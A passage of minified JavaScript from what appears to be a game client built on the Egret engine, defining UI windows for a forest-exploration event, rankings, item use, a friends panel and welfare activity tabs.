t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.data=t[0],this.buyUpData(this.data)},e.prototype.buyUpData=function(t){if(void 0===t&&(t=null),!t){var e=a.ForestModel.ins().forestLocation;t=a.ForestModel.ins().getCurData(e)}var i=o.GlobalConfig.YoumingForestRraderEventConfig[t.eventId],n=[];if(t.location==a.ForestModel.ins().forestLocation){for(var s=0;s<t.eventList.length;s++)i.award[t.eventList[s]-1]&&n.push([t,1]);this.currentState="state2"}else{for(var s=0;s<t.eventList.length;s++)i.award[t.eventList[s]-1]&&n.push([t]);this.currentState="state1"}this.listArc.removeAll(),this.listArc.replaceAll(n),this.eList.validateNow()},e.prototype.onClick=function(t){switch(t.target){case this.sureBtn:win.close(this);break;case this.notBtn:s.Fb2CT.ins().sendForestPoint(this.data.location),win.close(this)}},e}(n.BaseView);e.ForestEvent2Win=l,window.ForestEvent2Win=l,__reflect(l.prototype,"ForestEvent2Win",[]),window.ForestEvent2Win=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestEvent3Win=void 0;var n=i(5),o=i(1),s=i(0),a=i(54),r=i(87),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="ForestEvent3",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),observe(this,this.moveComplete,a.Fb2CT.ins().moveComplete),observe(this,this.updata,a.Fb2CT.ins().postForestMapInfo)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.data=t[0],this.updata()},e.prototype.updata=function(){var t=s.GlobalConfig.YoumingForestEventConfig[this.data.eventId],e=r.ForestModel.ins().forestState,i=r.ForestModel.ins().forestLocation;1==t.type&&(1==e&&i==this.data.location?(this.currentState="state2",this.setText2()):(this.currentState="state3",this.setText13())),3==t.type&&(1==e&&i==this.data.location?(this.currentState="state2",this.setText2()):(this.currentState="state1",this.setText13()))},e.prototype.setState2=function(){this.alpha=1,this.setText2()},e.prototype.setText13=function(){var t=s.GlobalConfig.YoumingForestRewardEventConfig[this.data.eventId];window.preDesc(this.txt_desc,this.data)},e.prototype.setText2=function(){var t=s.GlobalConfig.YoumingForestRewardEventConfig[this.data.eventId];if(t.buff){this.txt_desc.text=t.desc;var e=r.ForestModel.ins().getBuffId(this.data.location,this.data.eventId);if(e){var i=s.GlobalConfig.YoumingForestBuffConfig[e];this.txt_desc2.textFlow=n.TextFlowMaker.generateTextFlow(i.desc)}}else this.txt_desc.text=t.desc,this.txt_desc2.textFlow=n.TextFlowMaker.generateTextFlow(t.desc2)},e.prototype.onClick=function(t){switch(t.target){case this.sureBtn:win.close(this);break;case this.notBtn:this.alpha=0,this.currentState="state2",this.setState2(),a.Fb2CT.ins().sendForestPoint(this.data.location)}},e.prototype.moveComplete=function(t){void 0===t&&(t=null),this.alpha=0,this.currentState="state2",this.setState2()},__decorate([delayCall(600)],e.prototype,"setState2",null),__decorate([delayCall(50)],e.prototype,"setText13",null),e}(o.BaseView);e.ForestEvent3Win=l,window.ForestEvent3Win=l,__reflect(l.prototype,"ForestEvent3Win",[]),window.ForestEvent3Win=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestPropWin=void 0;var n=i(5),o=i(1),s=i(0),a=i(6),r=i(10),l=i(54),h=i(87),u=i(2),p=i(398),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ForestPropSkin",e.lastSelected=-1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.propList.itemRenderer=p.ForestPropItemRender,this.propList.dataProvider=this.propArc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTouch);var i=s.GlobalConfig.YoumingForestItemConfig,o=[];for(var l in i){var u=i[l];o.push(u)}if(this.propArc.source=o,this.propList.numElements<=0)return this.txt_name.text=gettext("未选中道具"),void(this.txt_desc.textFlow=n.TextFlowMaker.generateTextFlow(""));h.ForestModel.ins().curSelecteIndex=0,this.seleFirst();var p=a.BagCT.ins().getBagItemById(o[0].id);this.btn.visible=!!p,this.txt_name.text=i[o[0].id].name;var d=s.GlobalConfig.ItemConfig[o[0].id];this.txt_name.textColor=r.ItemUtil.getQualityColor(r.ItemUtil.getQuality2(d)),this.txt_desc.textFlow=n.TextFlowMaker.generateTextFlow(i[o[0].id].desc)},e.prototype.seleFirst=function(){if(!(this.propList.numElements<=0)){var t=this.propList.getElementAt(0);t.checkSelcted(0),this.propList.selectedIndex=0,this.lastSelected=0}},e.prototype.onTouch=function(t){switch(t.target){case this.btn:var e=this.propArc.source[this.propList.selectedIndex];if(e){if(h.ForestModel.ins().isForestFb())return void u.TipsCT.ins().showTips(gettext("当前场景中无法使用该物品"));l.Fb2CT.ins().sendForestUseGoods(e.id),win.close(this)}else u.TipsCT.ins().showTips(gettext("未选中道具"))}if(t.target.parent==this.propList){var i;this.lastSelected>=0&&(i=this.propList.getElementAt(this.lastSelected),i&&i.checkSelcted(this.propList.selectedIndex)),h.ForestModel.ins().curSelecteIndex=this.propList.selectedIndex,this.lastSelected=this.propList.selectedIndex,this.propList.dataProvider&&this.lastSelected>-1&&this.lastSelected<this.propList.dataProvider.length&&(i=this.propList.getElementAt(this.lastSelected),i&&i.checkSelcted(this.propList.selectedIndex))}if(this.propList.numElements<=0)return void u.TipsCT.ins().showTips(gettext("未选中道具"));var o=s.GlobalConfig.YoumingForestItemConfig,p=this.propArc.source[this.propList.selectedIndex],d=a.BagCT.ins().getBagItemById(p.id);this.btn.visible=!!d;var c=s.GlobalConfig.ItemConfig[p.id];this.txt_name.text=o[p.id].name,this.txt_name.textColor=r.ItemUtil.getQualityColor(r.ItemUtil.getQuality2(c)),this.txt_desc.textFlow=n.TextFlowMaker.generateTextFlow(o[p.id].desc)},__decorate([delayCall(100)],e.prototype,"seleFirst",null),e}(o.BaseView);e.ForestPropWin=d,window.ForestPropWin=d,__reflect(d.prototype,"ForestPropWin",[]),window.ForestPropWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestRankWin=void 0;var n=i(1),o=i(4),s=i(88),a=i(399),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ForestRankSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this._type=68,this.eList.itemRenderer=a.ForestRankItemRenderer,this.eList.dataProvider=this.eArc=new eui.ArrayCollection,observe(this,this.updateList,s.Rank.ins().postRankingData),this.addTouchEvent(this,this.onTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTouch),s.Rank.ins().sendGetRankingData(this._type)},e.prototype.updateList=function(t){if(t.type==this._type){this.selfPos.text=0<t.selfPos&&t.selfPos<=1e3?t.selfPos+"":gettext("未上榜");for(var e=t.getDataList(),i=[],n=0,s=0;s<e.length;s++){var a=e[s];i.push(a),a.player==o.ActorCC.myName&&(n=a.star)}this.eArc.source=i,this.labStarCount.text=n+""}},e.prototype.onTouch=function(t){t.target},e}(n.BaseView);e.ForestRankWin=r,window.ForestRankWin=r,__reflect(r.prototype,"ForestRankWin",[]),window.ForestRankWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestResetWin=void 0;var n=i(19),o=i(1),s=i(0),a=i(54),r=i(87),l=i(2),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ForestResetTips",e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.update,a.Fb2CT.ins().postForestMapLv)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTouch);var i=s.GlobalConfig.ItemConfig[2902];this.imgItem.source=RES_DIR_ITEMICON+i.icon+".png",this.imgItem2.source=RES_DIR_ITEMICON+i.icon+".png",this.labItemNum.text=n.GlobalFun.getItemCount(2902)+"",a.Fb2CT.ins().sendForestMapStarLv()},e.prototype.update=function(){this.labStarNum.text=r.ForestModel.ins().getAllStarCount()+""},e.prototype.onTouch=function(t){switch(t.target){case this.sureBtn:if(r.ForestModel.ins().isForestFb())return void l.TipsCT.ins().showTips(gettext("当前场景中无法使用该物品"));var e=n.GlobalFun.getItemCount(2902);e>0?a.Fb2CT.ins().sendForestUseGoods(2902):l.TipsCT.ins().showTips(gettext("道具不足")),win.close(this)}},e}(o.BaseView);e.ForestResetWin=h,window.ForestResetWin=h,__reflect(h.prototype,"ForestResetWin",[]),window.ForestResetWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestTipsWin=void 0;var n=i(1),o=i(54),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ForestTipsSkin",e.isHard=1,e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.update,o.Fb2CT.ins().postForestMapLv)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0]?(this.difficultyTips.visible=!0,this.confTips.visible=!1,this.isHard=2):(this.difficultyTips.visible=!1,this.confTips.visible=!0,this.isHard=1),this.addTouchEvent(this,this.onTouch)},e.prototype.update=function(){},e.prototype.onTouch=function(t){switch(t.target){case this.sureBtn:o.Fb2CT.ins().sendForestNext(this.isHard)}win.close(this)},e}(n.BaseView);e.ForestTipsWin=s,window.ForestTipsWin=s,__reflect(s.prototype,"ForestTipsWin",[]),window.ForestTipsWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestWin=void 0;var n=i(21),o=i(8),s=i(16),a=i(70),r=i(1),l=i(0),h=i(15),u=i(54),p=i(87),d=i(12),c=i(7),f=i(2),g=i(397),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ForestMainSkin",e.FULL_HEIGHT=2160,e.DIS_HEIGHT=1186,e.lastState=0,e.lastLocation=0,e.lastLv=0,e.eventDisList=[[]],e.ud=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.grPos.anchorOffsetX=this.grPos.width/2,this.grPos.anchorOffsetY=this.grPos.height/2},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,u.Fb2CT.ins().postForestInfo),observe(this,this.reSetView,u.Fb2CT.ins().postForestMapInfo),observe(this,this.update,u.Fb2CT.ins().postForestMapLv),this.lastLocation=p.ForestModel.ins().forestLocation,this.lastState=p.ForestModel.ins().forestState,this.lastLv=p.ForestModel.ins().forestLv,this.initView(),this.showEff(0),this.update(),this.locationTween(),2!=p.ForestModel.ins().forestState||t[0]||win.open("ForestBuffChoiceWin"),3==p.ForestModel.ins().forestState&&this.showEff(1);var i=this.eventDisList[this.eventDisList.length-1][0];i&&1==p.ForestModel.ins().forestState&&p.ForestModel.ins().forestLocation==i.dataVo.location&&this.showEff(2)},e.prototype.initView=function(){this.treasureEff=new n.MovieClip,this.eG.addChild(this.treasureEff),this.portal1Eff=new n.MovieClip,this.grEff1=new eui.Group,this.grEff1.addChild(this.portal1Eff),this.grEff1.width=50,this.grEff1.height=75;var t=new egret.Shape;this.grEff1.addChild(t),t.graphics.beginFill(65280,0),t.graphics.drawRect(-50,-75,100,150),t.graphics.endFill(),this.eG.addChild(this.grEff1),this.portal2Eff=new n.MovieClip,this.grEff2=new eui.Group,this.grEff2.addChild(this.portal2Eff),this.grEff2.width=50,this.grEff2.height=75;var e=new egret.Shape;this.grEff2.addChild(e),e.graphics.beginFill(65280,0),e.graphics.drawRect(-50,-75,100,150),e.graphics.endFill(),this.eG.addChild(this.grEff2),this.reSetView();var i=this.eventDisList[this.eventDisList.length-1][0];i&&(this.treasureEff.x=i.x+10,this.treasureEff.y=i.y,this.grEff1.x=i.x-100,this.grEff1.y=i.y,this.grEff2.x=i.x+100,this.grEff2.y=i.y)},e.prototype.onPointTap=function(t){var e=p.ForestModel.ins().forestLocation,i=p.ForestModel.ins().forestState;if(-1==i)return void f.TipsCT.ins().showTips(gettext("您已死亡，请先复活或重置"));var n=this.eventDisList[this.eventDisList.length-1][0],o=t.currentTarget;if(n==o&&3==i)return void u.Fb2CT.ins().sendForestEvent(n.dataVo.eventList[0]);if(0==e)return void(1==o.dataVo.layer||(!0)?this.openWin(o.dataVo):f.TipsCT.ins().showTips(gettext("到达后才可以查看")));for(var s=0;s<this.eventDisList.length;s++)for(var a=this.eventDisList[s],r=0;r<a.length;r++){var h=a[r];if(e==h.dataVo.location){if(h.dataVo.linePoint1==o.dataVo.location||h.dataVo.linePoint2==o.dataVo.location)return void(1==i||(!0)?this.openWin(o.dataVo):f.TipsCT.ins().showTips(gettext("当前位置事件未完成")));if(!0)return void this.openWin(o.dataVo);-1==i?void f.TipsCT.ins().showTips(gettext("当前为死亡状态，请先复活")):o.dataVo.layer<h.dataVo.layer?void f.TipsCT.ins().showTips(gettext("无法到达的位置")):void f.TipsCT.ins().showTips(gettext("到达后才可以查看"));var d=l.GlobalConfig.YoumingForestEventConfig[h.dataVo.eventId];if(4==d.type||5==d.type||6==d.type){if(1==i)return;if(2==i)return void win.open("ForestBuffChoiceWin")}if((1==d.type||3==d.type)&&1==i)return;this.openWin(o.dataVo)}}},e.prototype.openWin=function(t){var e=l.GlobalConfig.YoumingForestEventConfig[t.eventId];(4==e.type||5==e.type||6==e.type)&&win.open("ForestEvent1Win",t),2==e.type&&win.open("ForestEvent2Win",t),(1==e.type||3==e.type)&&win.open("ForestEvent3Win",t)},e.prototype.eSscrollV=function(){this.eSc.viewport.validateNow();var t=0,e=this.contentGroup.height-this.eG.height,i=this.grPos.y-this.eG.height/2;i>e&&(i=e),t>i&&(i=t),this.eSc.viewport.scrollV=i},e.prototype.onClick=function(t){switch(t.target){case this.ePropBtn:win.open("ForestPropWin");break;case this.eBuffBtn:win.open("ForestBuffWin");break;case this.eRankBtn:win.open("ForestRankWin");break;case this.eResetBtn:win.open("ForestResetWin");break;case this.eStoreBtn:win.open2("ShopWin","weekMarketMainPanel",1);break;case this.grEff1:win.open("ForestTipsWin");break;case this.grEff2:win.open("ForestTipsWin",1);break;case this.eCloseBtn:win.close(this);break;case this.btnHelp2:var e=l.GlobalConfig.HelpInfoConfig[319];win.open("CommonHelpWin",(null===e||void 0===e?void 0:e.text)||"")}},e.prototype.update=function(){this.roleMove();var t=this.eventDisList[this.eventDisList.length-1][0],e=p.ForestModel.ins().forestState,i=p.ForestModel.ins().forestLocation,n=p.ForestModel.ins().forestLv;if(this.lastLocation==i&&this.lastState!=e){1==e&&t.dataVo.location==i&&(this.showEff(2),f.TipsCT.ins().showTips(gettext("领取成功")));var o=win.openCheck("ForestBattleResultWin");2==e&&0==o&&win.open("ForestBuffChoiceWin"),3==e&&this.showEff(1)}this.lastLv!=n&&this.reSetView();var s=p.ForestModel.ins().getCurData(i);if(s){var a=l.GlobalConfig.YoumingForestEventConfig[s.eventId];2==a.type&&win.open("ForestEvent2Win",s)}switch(e){case-1:this.labState.text=gettext("死亡");break;case 0:this.labState.text=gettext("未完成");break;case 1:this.labState.text=gettext("完成");break;case 2:this.labState.text=gettext("领Buff");break;case 3:this.labState.text=gettext("领奖励")}this.posName.text=gettext("区域{0}",n),this.labStarNum.text=p.ForestModel.ins().getAllStarCount()+"",this.lastState=e,this.lastLocation=i,this.lastLv=n,this.labrevive.text=p.ForestModel.ins().forestResetCount+"/3",this.eSscrollV()},e.prototype.reSetView=function(){this.showEff(0);for(var t=0;t<this.eventDisList.length;t++)for(var e=0;e<this.eventDisList[t].length;e++){var i=this.eventDisList[t][e];i.removeEventListener(egret.TouchEvent.TOUCH_END,this.onPointTap,this),s.DisplayUtils.removeFromParent(i)}this.eventDisList=[[]];var n=p.ForestModel.ins().mapInofList;this.viewShape||(this.viewShape=new egret.Shape,this.grEvent.addChild(this.viewShape)),this.viewShape.graphics.clear(),this.viewShape.graphics.lineStyle(3,7960953,1,!1,egret.StageScaleMode.EXACT_FIT,egret.CapsStyle.ROUND,egret.JointStyle.ROUND,5,[5,5]);for(var o=[[]],r=0;r<n.length;r++)o[n[r].layer]||(o[n[r].layer]=[]),o[n[r].layer].push(n[r]);for(var h=0;h<o.length;h++){for(var r=0;r<o[h].length;r++){var u=new g.ForestEventView;u.setData(o[h][r]);var d=(l.GlobalConfig.YoumingForestBaseConfig.mapDisX[1]-l.GlobalConfig.YoumingForestBaseConfig.mapDisX[0])/2,c=(l.GlobalConfig.YoumingForestBaseConfig.mapDisY[1]-l.GlobalConfig.YoumingForestBaseConfig.mapDisY[0])/2,f=d+l.GlobalConfig.YoumingForestBaseConfig.mapDisX[0],m=(d+l.GlobalConfig.YoumingForestBaseConfig.mapDisY[0],10*Math.random()),v=m>5?1:-1,y=Math.random()*d*v,C=Math.random()*c*v;h==o.length-1&&(y=0),1==o[h].length?u.x=f*r+350+y:2==o[h].length?u.x=f*r+250+y:3==o[h].length?u.x=f*r+150+y:4==o[h].length&&(u.x=f*r+50+y),u.y=this.contentGroup.height-200*h-50+C,this.grEvent.addChild(u),this.eventDisList[h]||(this.eventDisList[h]=[]),this.eventDisList[h].push(u),u.addEventListener(egret.TouchEvent.TOUCH_END,this.onPointTap,this)}if(h>0)for(var T=this.eventDisList[h-1],b=this.eventDisList[h],w=0;w<b.length;w++)for(var I=b[w].dataVo,t=0;t<T.length;t++){var _=T[t].dataVo.linePoint1,S=T[t].dataVo.linePoint2,x=a.MathUtils.mid_point(b[w].x,b[w].y,T[t].x,T[t].y);if(_==I.location&&0!=I.location){this.viewShape.graphics.moveTo(b[w].x,b[w].y);var D=Math.random()>.5?20:-20;this.viewShape.graphics.curveTo(x.x+D,x.y+D,T[t].x,T[t].y),this.viewShape.graphics.endFill()}if(S==I.location&&0!=I.location){var D=Math.random()>.5?20:-20;this.viewShape.graphics.moveTo(b[w].x,b[w].y),this.viewShape.graphics.curveTo(x.x+D,x.y+D,T[t].x,T[t].y),this.viewShape.graphics.endFill()}}}this.grEvent.width=720},e.prototype.showEff=function(t){var e=l.GlobalConfig.YoumingForestBaseConfig.youmingForestExt,i=this.eventDisList[this.eventDisList.length-1][0];switch(this.grEff1.visible=!1,this.grEff2.visible=!1,t){case 0:this.treasureEff.stop(),this.treasureEff.parent&&this.eG.removeChild(this.treasureEff),this.portal1Eff.stop(),this.portal2Eff.stop();break;case 1:var n=l.GlobalConfig.YoumingForestBaseConfig.rewardEff;this.treasureEff.playFile(RES_DIR_EFF+n,-1),this.eG.contains(this.treasureEff)||this.eG.addChild(this.treasureEff),this.portal1Eff.stop(),this.portal2Eff.stop(),this.grEff1.x=i.x-100;break;case 2:if(this.treasureEff.stop(),this.treasureEff.parent&&this.eG.removeChild(this.treasureEff),3==p.ForestModel.ins().forestLv)return void(this.labState.text=gettext("已通关"));var o=l.GlobalConfig.YoumingForestBaseConfig.Portal1;this.portal1Eff.playFile(RES_DIR_EFF+o,-1),this.grEff1.x=i.x,this.grEff1.visible=!0;var s=p.ForestModel.ins().forestLv;p.ForestModel.ins().hardStateTime;if(this.isHfTerm()&&e.replace[s]){var a=l.GlobalConfig.YoumingForestBaseConfig.Portal2;this.portal2Eff.playFile(RES_DIR_EFF+a,-1),this.grEff1.x=i.x-100,this.grEff2.visible=!0}}},e.prototype.isHfTerm=function(){var t=p.ForestModel.ins().hardStateTime;if(0==t)return!1;var e=l.GlobalConfig.YoumingForestBaseConfig.youmingForestExt,i=o.DateUtils.formatMiniDateTime(t)+e.openDay*o.DateUtils.MS_PER_DAY;return c.GameServerCC.serverTime-i>0},e.prototype.roleMove=function(){var t=p.ForestModel.ins().forestLocation;if(0==t)return this.grPos.x=337,void(this.grPos.y=2e3);for(var e=0;e<this.eventDisList.length;e++)for(var i=this.eventDisList[e],n=0;n<i.length;n++)i[n].dataVo.location==t&&(this.grPos.x=i[n].x,this.grPos.y=i[n].y)},e.prototype.locationTween=function(){var t=this,e=function(){t.imgLocation.y<0&&(t.ud=1),t.imgLocation.y>10&&(t.ud=-1),t.imgLocation.y+=t.ud};this.tim=new egret.Timer(30,0),this.tim.addEventListener(egret.TimerEvent.TIMER,e,this),this.tim.start()},e.prototype.tabRp=function(){return!1},e.openCheck=function(){var t=d.OpenSystem.ins().checkSysOpen(h.SystemType.FOREST);return t||f.TipsCT.ins().showTips(d.OpenSystem.ins().getNoOpenTips(h.SystemType.FOREST)),t},__decorate([delayCall(100)],e.prototype,"eSscrollV",null),e}(r.BaseView);e.ForestWin=m,window.ForestWin=m,__reflect(m.prototype,"ForestWin",[]),window.ForestWin=m},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FriendBgWin=void 0;var n=i(61),o=i(1),s=i(196),a=i(93),r=function(t){function e(){var e=t.call(this)||this;return e.BIG_HEIGHT=880,e.LITTLE_HEIGHT=403,e.layoutNum=LayoutNum.top,e.isStretch=!1,e._sn_="FriendsWinSkin",e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return n.LocationProperty.isIosTS?!1:!0},e.prototype.skinComplete=function(){this.tab.dataProvider=this.viewStack},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0]?t[0]:0,n=0;0==i&&(n=t[1]?t[1]:0),this.viewStack.selectedIndex=i,this.addChangeEvent(this.tab,this.changeView),this.addTouchEvent(this.btnClose,this.onTap),this.addTouchEvent(this.upBtn,this.onTap),this.addChangeEvent(this.tab,this.onTap),a.Friends.ins().sendFriendsList(),this.friendChatPanel.$param=[n],this.updateRedPoint(),this.setUpBtn(),this.changeView(),observe(this,this.updateRedPoint,a.Friends.ins().postFriendChange),observe(this,this.updateRedPoint,s.MailCT.ins().postMailDetail),observe(this,this.updateRedPoint,s.MailCT.ins().postMailData)},e.prototype.changeView=function(){(0==this.viewStack.selectedIndex||1==this.viewStack.selectedIndex)&&this.readMsg()},e.prototype.readMsg=function(){for(var t in a.Friends.ins().newMsg)a.Friends.ins().newMsg[t]=!1},e.prototype.onShowdMailPoint=function(){s.MailCT.ins().mailData?this.mailRedPoint.visible=s.MailCT.ins().getUnreadMail()>0:this.mailRedPoint.visible=!1},e.prototype.setStretchWin=function(){this.isStretch?(this.isStretch=!1,this.upBtn.scaleY=1,this.upGroup.height=this.LITTLE_HEIGHT):(this.isStretch=!0,this.upBtn.scaleY=-1,this.upGroup.height=this.BIG_HEIGHT)},e.prototype.setUpBtn=function(){this.upBg.visible=this.upBtn.visible=0==this.viewStack.selectedIndex},e.prototype.updateRedPoint=function(){this.applyRedPoint.visible=a.Friends.ins().appList.length>0,this.onShowdMailPoint()},e.prototype.onTap=function(t){switch(t.target){case this.btnClose:win.close(this);break;case this.tab:0!=this.viewStack.selectedIndex&&this.isStretch&&this.setStretchWin(),this.setUpBtn();break;case this.upBtn:this.setStretchWin()}},e}(o.BaseView);e.FriendBgWin=r,window.FriendBgWin=r,__reflect(r.prototype,"FriendBgWin",[]),window.FriendBgWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliMain1001=void 0;var n=i(1),o=i(17),s=i(0),a=i(9),r=i(56),l=i(29),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliMain1001Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.updateTabRp,o.RedPointBaseSys.ins().RpChange)},e.prototype.addDisplay=function(t){this.initTab()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){this.eVs.removeChildren();var t=a.Activity.ins().activityData,e=Object.keys(t);if(!e.length)return!1;var i=[];for(var n in t){var o=t[n];if(r.Activity1001PageStyle.Activity1001==o.pageStyle&&o.isOpenActivity()&&!o.getHide()){var h=l.ActivityPanel.create(o.id,o.type);h&&(h.name=s.GlobalConfig.ActivityBtnConfig[o.id].title||"",h.visible=!1,h.horizontalCenter="0",h.top="0",h.bottom="0",i.push(h))
}}i.sort(function(t,e){var i=s.GlobalConfig.ActivityBtnConfig[t.activityID].sort,n=s.GlobalConfig.ActivityBtnConfig[e.activityID].sort;return i>n?1:n>i?-1:0});for(var u=0;u<i.length;u++)this.eVs.addChild(i[u]);this.eTab.selectedIndex=this.initSelected(),this.eVs.selectedIndex=this.initSelected()},e.prototype.initSelected=function(){return 0},e.prototype.tabRp=function(){var t;if(window.platform.isshen())return!1;var e=a.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(r.Activity1001PageStyle.Activity1001==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(n.BaseView);e.FuliMain1001=h,window.FuliMain1001=h,__reflect(h.prototype,"FuliMain1001",[]),window.FuliMain1001=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliMain1002=void 0;var n=i(1),o=i(17),s=i(0),a=i(9),r=i(29),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.curActType=1002,e._sn_="FuliMain1001Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.updateTabRp,o.RedPointBaseSys.ins().RpChange)},e.prototype.addDisplay=function(t){this.initTab()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){this.eVs.removeChildren();var t=a.Activity.ins().activityData,e=Object.keys(t);if(!e.length)return!1;var i=[];for(var n in t){var o=t[n];if(this.curActType==o.pageStyle&&o.isOpenActivity()&&!o.getHide()){var l=r.ActivityPanel.create(o.id,o.type);l&&(l.name=s.GlobalConfig.ActivityBtnConfig[o.id].title||"",l.visible=!1,l.horizontalCenter="0",l.top="0",l.bottom="0",i.push(l))}}i.sort(function(t,e){var i=s.GlobalConfig.ActivityBtnConfig[t.activityID].sort,n=s.GlobalConfig.ActivityBtnConfig[e.activityID].sort;return i>n?1:n>i?-1:0});for(var h=0;h<i.length;h++)this.eVs.addChild(i[h]);this.eTab.selectedIndex=this.initSelected(),this.eVs.selectedIndex=this.initSelected()},e.prototype.initSelected=function(){return 0},e.prototype.tabRp=function(){var t;if(window.platform.isshen())return!1;var e=a.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(this.curActType==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(n.BaseView);e.FuliMain1002=l,window.FuliMain1002=l,__reflect(l.prototype,"FuliMain1002",[]),window.FuliMain1002=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliMain6=void 0;var n=i(1),o=i(17),s=i(0),a=i(9),r=i(56),l=i(29),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliMain6Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(t){observe(this,this.updateTabRp,o.RedPointBaseSys.ins().RpChange),this.initTab()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){this.eVs.removeChildren();var t=a.Activity.ins().activityData,e=Object.keys(t);if(!e.length)return!1;var i=[];for(var n in t){var o=t[n];if(r.Activity6PageStyle.Activity6==o.pageStyle){if(!o.isOpenActivity()||o.getHide())continue;var h=l.ActivityPanel.create(o.id,o.type);if(!h)continue;h.name=s.GlobalConfig.ActivityBtnConfig[o.id].title||"",h.visible=!1,h.horizontalCenter="0",h.top="0",h.bottom="0",i.push(h)}}i.sort(function(t,e){var i=s.GlobalConfig.ActivityBtnConfig[t.activityID].sort,n=s.GlobalConfig.ActivityBtnConfig[e.activityID].sort;return i>n?1:n>i?-1:0});for(var u=0;u<i.length;u++)this.eVs.addChild(i[u]);this.eTab.selectedIndex=this.initSelected(),this.eVs.selectedIndex=this.initSelected()},e.prototype.initSelected=function(){return 0},e.prototype.tabRp=function(){var t;if(window.platform.isshen())return!1;var e=a.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(r.Activity6PageStyle.Activity6==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(n.BaseView);e.FuliMain6=h,window.FuliMain6=h,__reflect(h.prototype,"FuliMain6",[]),window.FuliMain6=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliOrderMain=void 0;var n=i(1),o=i(9),s=i(56),a=i(29),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliOrderMainSkin",e.pageStyle=s.ActivityPageStyle.Activity41,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.initTab()},e.prototype.initTab=function(){this.eVs.removeChildren();var t=[],e=o.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var s=e[n];if(s.pageStyle==this.pageStyle){s.isOpenActivity()&&!s.getHide()&&t.push(s);var r=a.ActivityPanel.create(s.id,s.type);if(!r)continue;r.visible=!1,this.eVs.addChild(r)}}this.eTab.selectedIndex=this.initSelected(),this.eVs.selectedIndex=this.initSelected()},e.prototype.initSelected=function(){return 0},e}(n.BaseView);e.FuliOrderMain=r,window.FuliOrderMain=r,__reflect(r.prototype,"FuliOrderMain",[]),window.FuliOrderMain=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuncShowPanel=void 0;var n=i(5),o=i(1),s=i(412),a=i(0),r=i(9),l=i(6),h=i(23),u=i(7),p=i(2),d=i(413),c=i(84),f=function(t){function e(){var 